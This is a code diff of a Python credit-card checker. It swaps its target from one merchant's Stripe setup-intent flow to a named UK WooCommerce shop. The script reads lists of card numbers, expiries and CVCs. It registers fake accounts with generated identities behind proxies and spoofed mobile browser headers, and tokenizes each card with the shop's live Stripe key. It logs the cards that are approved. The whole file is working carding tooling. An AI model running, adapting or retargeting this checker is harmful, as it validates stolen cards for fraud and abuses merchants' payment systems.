@@ -3,6 +3,383 @@ import urllib.parse
 import os
 import uuid
 import random
+import re
+from faker import Faker
+
+# ── Site config ───────────────────────────────────────────────────────────────
+BASE    = "https://www.propski.co.uk"
+PK_KEY  = "pk_live_4kM0zYmj8RdKCEz9oaVNLhvl00GpRole3Q"
+_fake   = Faker()
+# ─────────────────────────────────────────────────────────────────────────────
+
+# Module-level session state — reused across cards so we don't re-register each time
+_session        = None
+_add_card_nonce = None
+_session_email  = None
+
+
+def _create_session(proxy=None):
+    s = requests.Session()
+    s.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
+                      '(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+    })
+    if proxy:
+        s.proxies.update({"http": proxy, "https": proxy})
+    return s
+
+
+def _get_nonce(url, pattern, session, headers=None):
+    try:
+        r = session.get(url, headers=headers or {}, timeout=20)
+        if r.status_code != 200:
+            return None
+        m = re.search(pattern, r.text)
+        return m.group(1) if m else None
+    except Exception:
+        return None
+
+
+def _register_account(session, email):
+    try:
+        register_nonce = _get_nonce(
+            f"{BASE}/my-account/",
+            r'name="woocommerce-register-nonce" value="(.*?)"',
+            session,
+            headers={'referer': f'{BASE}/my-account/'}
+        )
+        if not register_nonce:
+            return False
+        data = {
+            'email': email,
+            'wc_order_attribution_session_entry': f'{BASE}/my-account/',
+            'wc_order_attribution_user_agent': session.headers.get('User-Agent'),
+            'woocommerce-register-nonce': register_nonce,
+            '_wp_http_referer': '/my-account/',
+            'register': 'Register',
+        }
+        r = session.post(
+            f"{BASE}/my-account/",
+            params={'action': 'register'},
+            data=data,
+            headers={'referer': f'{BASE}/my-account/'},
+            timeout=20
+        )
+        return r.status_code in (200, 302)
+    except Exception:
+        return False
+
+
+def _post_billing_address(session, email):
+    try:
+        url = f"{BASE}/my-account/edit-address/billing/"
+        r = session.get(url, headers={'referer': f'{BASE}/my-account/edit-address/'}, timeout=20)
+        if r.status_code != 200:
+            return False
+        m = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', r.text)
+        address_nonce = m.group(1) if m else None
+        if not address_nonce:
+            return False
+        data = {
+            'billing_first_name': _fake.first_name(),
+            'billing_last_name':  _fake.last_name(),
+            'billing_company':    '',
+            'billing_country':    'AU',
+            'billing_address_1':  _fake.street_address(),
+            'billing_address_2':  '',
+            'billing_city':       'Sydney',
+            'billing_state':      'NSW',
+            'billing_postcode':   '2000',
+            'billing_phone':      '0412345678',
+            'billing_email':      email,
+            'save_address':       'Save address',
+            'woocommerce-edit-address-nonce': address_nonce,
+            '_wp_http_referer':   '/my-account/edit-address/billing/',
+            'action':             'edit_address',
+        }
+        r2 = session.post(url, headers={'origin': BASE, 'referer': url}, data=data, timeout=20)
+        return r2.status_code in (200, 302)
+    except Exception:
+        return False
+
+
+def _get_add_card_nonce(session):
+    try:
+        url = f"{BASE}/my-account/add-payment-method/"
+        r = session.get(url, headers={'referer': f'{BASE}/my-account/payment-methods/'}, timeout=20)
+        if r.status_code != 200:
+            return None
+        m = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', r.text)
+        return m.group(1) if m else None
+    except Exception:
+        return None
+
+
+def _init_session(proxy=None):
+    """Register a new WooCommerce account and return (session, nonce, email)."""
+    email = (f"{_fake.first_name().lower()}"
+             f"{_fake.last_name().lower()}"
+             f"{random.randint(10,99)}@gmail.com")
+    print(f"[ST] Registering new account: {email}")
+    s = _create_session(proxy)
+
+    if not _register_account(s, email):
+        print("[ST] ❌ Failed to register account")
+        return None, None, None
+
+    if not _post_billing_address(s, email):
+        print("[ST] ❌ Failed to post billing address")
+        return None, None, None
+
+    nonce = _get_add_card_nonce(s)
+    if not nonce:
+        print("[ST] ❌ Failed to get add-card nonce")
+        return None, None, None
+
+    print("[ST] ✅ Session ready")
+    return s, nonce, email
+
+
+# ── Public API — same signatures bott.py expects ─────────────────────────────
+
+def get_setup_intent(proxy=None):
+    """
+    Step 1 — Bootstrap WooCommerce session.
+    Returns (email, nonce) which act as (setup_intent_id, client_secret)
+    in the existing bott.py call pattern.
+    """
+    global _session, _add_card_nonce, _session_email
+    try:
+        if _session is None or _add_card_nonce is None:
+            _session, _add_card_nonce, _session_email = _init_session(proxy)
+
+        if _session is None:
+            return None, None
+
+        return _session_email, _add_card_nonce
+
+    except Exception as e:
+        print(f"[ST] Error in get_setup_intent: {e}")
+        return None, None
+
+
+def create_payment_method(card_details, proxy=None):
+    """
+    Step 2 — Tokenize card via Stripe /v1/sources.
+    Returns (source_id, source_data) or (None, None) on failure.
+    """
+    try:
+        headers = {
+            'authority':          'api.stripe.com',
+            'accept':             'application/json',
+            'accept-language':    'en-US,en;q=0.9',
+            'cache-control':      'no-cache',
+            'content-type':       'application/x-www-form-urlencoded',
+            'origin':             'https://js.stripe.com',
+            'pragma':             'no-cache',
+            'referer':            'https://js.stripe.com/',
+            'sec-ch-ua':          '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile':   '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest':     'empty',
+            'sec-fetch-mode':     'cors',
+            'sec-fetch-site':     'same-site',
+            'user-agent':         'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
+                                  '(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        }
+        data = {
+            'referrer':            BASE,
+            'type':                'card',
+            'owner[email]':        _session_email or 'test@gmail.com',
+            'card[number]':        card_details['number'],
+            'card[cvc]':           card_details['cvc'],
+            'card[exp_month]':     card_details['exp_month'],
+            'card[exp_year]':      card_details['exp_year'],
+            'guid':                str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
+            'muid':                str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
+            'sid':                 str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
+            'pasted_fields':       'number',
+            'payment_user_agent':  'stripe.js/8702d4c73a; stripe-js-v3/8702d4c73a; split-card-element',
+            'time_on_page':        str(random.randint(30000, 900000)),
+            'client_attribution_metadata[client_session_id]':           str(uuid.uuid4()),
+            'client_attribution_metadata[merchant_integration_source]': 'elements',
+            'client_attribution_metadata[merchant_integration_subtype]':'cardNumber',
+            'client_attribution_metadata[merchant_integration_version]':'2017',
+            'key':                 PK_KEY,
+        }
+
+        proxies = {"http": proxy, "https": proxy} if proxy else None
+        print(f"[ST] Tokenizing card ending in {card_details['number'][-4:]}...")
+        resp = requests.post(
+            'https://api.stripe.com/v1/sources',
+            headers=headers,
+            data=urllib.parse.urlencode(data),
+            proxies=proxies,
+            timeout=30
+        )
+
+        if resp.status_code == 200:
+            j = resp.json()
+            source_id = j.get('id')
+            if source_id:
+                return source_id, j
+            return None, None
+        elif resp.status_code == 429:
+            print("[ST] Rate limited on tokenize")
+            return None, None
+        else:
+            print(f"[ST] Tokenize failed: {resp.status_code} — {resp.text[:200]}")
+            return None, None
+
+    except Exception as e:
+        print(f"[ST] Error creating payment method: {e}")
+        return None, None
+
+
+def confirm_setup_intent(setup_intent_id, client_secret, payment_method_id,
+                         payment_method_data, card_details, proxy=None):
+    """
+    Step 3 — Attach source to WooCommerce site via wc_stripe_create_setup_intent.
+    Returns (success: bool, response_data: dict)
+    """
+    global _session, _add_card_nonce, _session_email
+
+    try:
+        nonce = client_secret  # client_secret carries the WC nonce from get_setup_intent
+
+        if _session is None:
+            print("[ST] No active session for attach step")
+            return False, {"error": {"message": "No active session"}}
+
+        headers = {
+            'authority':          BASE.replace('https://', ''),
+            'accept':             '*/*',
+            'accept-language':    'en-US,en;q=0.9',
+            'cache-control':      'no-cache',
+            'pragma':             'no-cache',
+            'sec-ch-ua':          '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile':   '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest':     'empty',
+            'sec-fetch-mode':     'cors',
+            'sec-fetch-site':     'same-origin',
+            'user-agent':         'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
+                                  '(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'content-type':       'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin':             BASE,
+            'referer':            f'{BASE}/my-account/add-payment-method/',
+        }
+        data = {
+            'stripe_source_id': payment_method_id,
+            'nonce':            nonce,
+        }
+
+        if proxy:
+            _session.proxies.update({"http": proxy, "https": proxy})
+
+        print(f"[ST] Attaching source for card ending in {card_details['number'][-4:]}...")
+        r = _session.post(
+            f'{BASE}/',
+            params={'wc-ajax': 'wc_stripe_create_setup_intent'},
+            headers=headers,
+            data=data,
+            timeout=30
+        )
+
+        if r.status_code == 429:
+            print("[ST] Rate limited on attach")
+            return False, {"error": {"message": "Rate limited"}}
+
+        if r.status_code == 200:
+            try:
+                payload = r.json()
+            except Exception:
+                return False, {"error": {"message": "Unparseable response"}}
+
+            status = payload.get("status")
+
+            if status == "success":
+                print("[ST] ✅ Card approved")
+                save_approved_card(card_details)
+                # Nonce is consumed — refresh on next card
+                _add_card_nonce = None
+                return True, payload
+
+            elif status == "requires_action":
+                print("[ST] 3DS required — card live but needs action")
+                _add_card_nonce = None
+                return False, payload
+
+            elif status == "error":
+                err     = payload.get("error", {})
+                msg     = err.get("message", "Unknown error")
+                code    = err.get("code", "")
+                decline = err.get("decline_code", "")
+                print(f"[ST] ❌ Declined — code={code} decline={decline} msg={msg}")
+                return False, payload
+
+            else:
+                print(f"[ST] Unknown status: {status}")
+                return False, payload
+
+        elif r.status_code == 400:
+            try:
+                payload = r.json()
+                msg = payload.get("data", {}).get("error", {}).get("message", "400 error")
+            except Exception:
+                msg = "400 with unparseable body"
+            print(f"[ST] ❌ 400 Declined: {msg}")
+            return False, {"error": {"message": msg, "code": "card_declined"}}
+
+        else:
+            print(f"[ST] Unexpected HTTP {r.status_code}")
+            return False, {"error": {"message": f"HTTP {r.status_code}"}}
+
+    except Exception as e:
+        print(f"[ST] Error in confirm_setup_intent: {e}")
+        return False, str(e)
+
+
+def save_approved_card(card_details):
+    try:
+        with open('approved.txt', 'a', encoding='utf-8') as f:
+            f.write(
+                f"{card_details['number']}|{card_details['exp_month']}|"
+                f"{card_details['exp_year']}|{card_details['cvc']} Status: Approved\n"
+            )
+    except Exception as e:
+        print(f"Error saving approved card: {e}")
+
+
+def check_card(card_details, proxy=None):
+    print(f"\n{'='*50}")
+    print(f"Checking card: {card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}")
+    print(f"{'='*50}")
+
+    setup_intent_id, client_secret = get_setup_intent(proxy=proxy)
+    if not setup_intent_id:
+        return False
+
+    payment_method_id, payment_method_data = create_payment_method(card_details, proxy=proxy)
+    if not payment_method_id:
+        return False
+
+    success, result = confirm_setup_intent(
+        setup_intent_id,
+        client_secret,
+        payment_method_id,
+        payment_method_data,
+        card_details,
+        proxy=proxy
+    )
+
+    if success:
+        print("✅ Success!")
+        return True
+    else:
+        print("❌ Failed")
+        return False
+
 
 def read_cc_file(filename):
     cards = []
@@ -14,10 +391,10 @@ def read_cc_file(filename):
                     parts = line.split('|')
                     if len(parts) == 4:
                         cards.append({
-                            'number': parts[0],
+                            'number':    parts[0],
                             'exp_month': parts[1],
-                            'exp_year': parts[2],
-                            'cvc': parts[3]
+                            'exp_year':  parts[2],
+                            'cvc':       parts[3]
                         })
                     else:
                         print(f"Invalid format in line: {line}")
@@ -25,268 +402,14 @@ def read_cc_file(filename):
     except FileNotFoundError:
         print(f"Error: File {filename} not found.")
         return []
- 
 
-def save_approved_card(card_details):
-    try:
-        with open('approved.txt', 'a', encoding='utf-8') as file:
-            card_string = f"{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']} Status: Approved\n"
-            file.write(card_string)
-    
-    except Exception as e:
-        print(f"Error saving approved card: {e}")
-
-def get_setup_intent(proxy=None):
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'accept-language': 'en-GB,en;q=0.9',
-        'content-type': 'application/json;charset=UTF-8',
-        'origin': 'https://app.iwallet.com',
-        'priority': 'u=1, i',
-        'referer': 'https://app.iwallet.com/p/a0a64c61-7dc1-4327-aca7-9ee129c156ae',
-        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-storage-access': 'none',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-        'x-csrf-token': 'qRPfCTzybNTiSLD/g8QYLxnRemoO/+LxZCWK8NpeGJ5Dti7pf+t6XuffupYXqN85ZLj+ovYC4qK7CpoeHTivLA==',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-
-    json_data = {
-        'publishable_key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV',
-        'usage': 'off_session',
-        'payment_method_types': ['card'],
-    }
-    
-    proxies = None
-    if proxy:
-        proxies = {"http": proxy, "https": proxy}
-
-    try:
-        print("Getting setup intent...")
-        response = requests.post(
-            'https://app.iwallet.com/api/v1/public/setup_intents', 
-            headers=headers, 
-            json=json_data,
-            proxies=proxies,
-            timeout=30
-        )
-        
-      
-        
-        if response.status_code == 201:
-            data = response.json()
-            setup_intent_id = data.get('id')
-            client_secret = data.get('client_secret')
-           
-            return setup_intent_id, client_secret
-        elif response.status_code == 429:
-            print(f"Rate limited, wait a bit")
-            return None, None
-        else:
-            print(f"Failed: {response.status_code}")
-            return None, None
-            
-    except Exception as e:
-        print(f"Error: {e}")
-        return None, None
-
-def create_payment_method(card_details, proxy=None):
-    headers = {
-        'accept': 'application/json',
-        'accept-language': 'en-GB,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'priority': 'u=1, i',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-    }
-
-    data = {
-        'type': 'card',
-        'billing_details[address][postal_code]': '11001',
-        'card[number]': card_details['number'],
-        'card[cvc]': card_details['cvc'],
-        'card[exp_month]': card_details['exp_month'],
-        'card[exp_year]': card_details['exp_year'],
-        'pasted_fields': 'number',
-        'payment_user_agent': 'stripe.js/2016dc44bd; stripe-js-v3/2016dc44bd; split-card-element',
-        'referrer': 'https://app.iwallet.com',
-        'time_on_page': str(random.randint(30000, 900000)),
-        'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
-        'client_attribution_metadata[merchant_integration_source]': 'elements',
-        'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
-        'client_attribution_metadata[merchant_integration_version]': '2017',
-        'key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV'
-    }
-    
-    proxies = None
-    if proxy:
-        proxies = {"http": proxy, "https": proxy}
-
-    try:
-        print(f"Creating payment method for card ending in {card_details['number'][-4:]}...")
-        encoded_payload = urllib.parse.urlencode(data)
-        response = requests.post(
-            'https://api.stripe.com/v1/payment_methods', 
-            headers=headers, 
-            data=encoded_payload,
-            proxies=proxies,
-            timeout=30
-        )
-        
-        if response.status_code == 200:
-            response_data = response.json()
-            payment_method_id = response_data.get('id')
-            return payment_method_id, response_data
-        elif response.status_code == 429:
-            print(f"Rate limited")
-            return None, None
-        else:
-            print(f"Failed: {response.status_code}")
-            return None, None
-            
-    except Exception as e:
-        print(f"Error creating payment method: {e}")
-        return None, None
-
-def confirm_setup_intent(setup_intent_id, client_secret, payment_method_id, payment_method_data, card_details, proxy=None):
-    headers = {
-        'accept': 'application/json',
-        'accept-language': 'en-GB,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'priority': 'u=1, i',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-    }
-
-    data = {
-        'payment_method': payment_method_id,
-        'key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV',
-        'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
-        'client_attribution_metadata[merchant_integration_source]': 'l1',
-        'client_secret': client_secret
-    }
-    
-    proxies = None
-    if proxy:
-        proxies = {"http": proxy, "https": proxy}
-
-    try:
-        print(f"Confirming setup intent for card ending in {card_details['number'][-4:]}...")
-        encoded_payload = urllib.parse.urlencode(data)
-        url = f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm'
-        
-        response = requests.post(
-            url,
-            headers=headers,
-            data=encoded_payload,
-            proxies=proxies,
-            timeout=30
-        )
-        
-        if response.status_code == 429:
-            print(f"Rate limited")
-            return False, {"error": {"message": "Rate limited"}}
-        elif response.status_code == 200:
-            response_data = response.json()
-            status = response_data.get('status')
-
-            card = payment_method_data.get('card', {})
-            country = card.get('country')
-            display_brand = card.get('display_brand')
-            brand = card.get('brand')
-            funding = card.get('funding')
-
-            if status == 'requires_action':
-                print(f"3DS Required - Brand: {display_brand or brand}, Country: {country}, Type: {funding}")
-                print("Card is live but needs 3DS — logged as CCN")
-                return False, response_data
-
-            if status == 'succeeded':
-                print(f"Success! Brand: {display_brand or brand}, Country: {country}, Type: {funding}")
-                save_approved_card(card_details)
-                return True, response_data
-            else:
-                print(f"Unexpected status '{status}' - Brand: {display_brand or brand}, Country: {country}")
-                return False, response_data
-        else:
-            response_data = response.json()
-            error_info = response_data.get('error', {})
-            error_code = error_info.get('code')
-            decline_code = error_info.get('decline_code')
-            message = error_info.get('message')
-            
-            payment_method = error_info.get('payment_method', {})
-            pm_id = payment_method.get('id')
-            card = payment_method.get('card', {})
-            country = card.get('country')
-            display_brand = card.get('display_brand')
-            brand = card.get('brand')
-            funding = card.get('funding')
-            
-            print(f"Failed - Code: {error_code}, Decline: {decline_code}, Msg: {message}")
-            if pm_id:
-                print(f"PM ID: {pm_id}, Brand: {display_brand or brand}, Country: {country}")
-            
-            return False, response_data
-            
-    except Exception as e:
-        print(f"Error: {e}")
-        return False, str(e)
-
-def check_card(card_details, proxy=None):
-    print(f"\n{'='*50}")
-    print(f"Checking card: {card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}")
-    print(f"{'='*50}")
-    
-    setup_intent_id, client_secret = get_setup_intent(proxy=proxy)
-    if not setup_intent_id:
-        return False
-    
-    payment_method_id, payment_method_data = create_payment_method(card_details, proxy=proxy)
-    if not payment_method_id:
-        return False
-    
-    success, result = confirm_setup_intent(
-        setup_intent_id, 
-        client_secret, 
-        payment_method_id,
-        payment_method_data,
-        card_details,
-        proxy=proxy
-    )
-    
-    if success:
-        print("Success!")
-        return True
-    else:
-        print("Failed")
-        return False
 
 if __name__ == "__main__":
     if os.path.exists('approved.txt'):
         os.remove('approved.txt')
-    
+
     cards = read_cc_file('cc.txt')
-    
+
     if not cards:
         print("No cards found")
     else:
@@ -296,7 +419,7 @@ if __name__ == "__main__":
             print(f"\nCard {i}/{len(cards)}")
             if check_card(card):
                 approved_count += 1
-        
+
         print(f"\n{'='*50}")
         print(f"Done: {approved_count}/{len(cards)} approved")
         print(f"{'='*50}")
